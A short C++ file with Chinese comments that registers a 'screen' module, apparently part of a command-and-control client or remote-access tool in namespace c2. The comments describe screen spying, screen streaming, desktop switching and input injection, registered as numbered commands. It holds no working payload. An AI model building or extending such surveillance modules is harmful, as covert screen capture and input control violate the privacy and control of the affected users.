// caps.cpp — "screen"（远程桌面）模块的能力清单
//
// 本模块 = 抓屏（screen_spy）+ 屏幕流与输入回放（screen_stream）+ 桌面切换（desktop_switch）
//           + 输入注入（input_replay），由它们自己向 core 的注册表登记指令：
//             0x1001 截屏、0x1002 屏幕流开关、配置钩子（4445 长连接所需）
//
// 这是模块化阶段 2 的产物：这些文件原本长在 client/core 里，由 cmd_dispatch 直接 include。
// 现在 core 不认识"屏幕"，本模块通过 capability.h 注册自己。
#include "capability.h"
#include "screen_module.h"

namespace c2
{

    void register_module_capabilities()
    {
        screen_module_register();
    }

}  // namespace c2
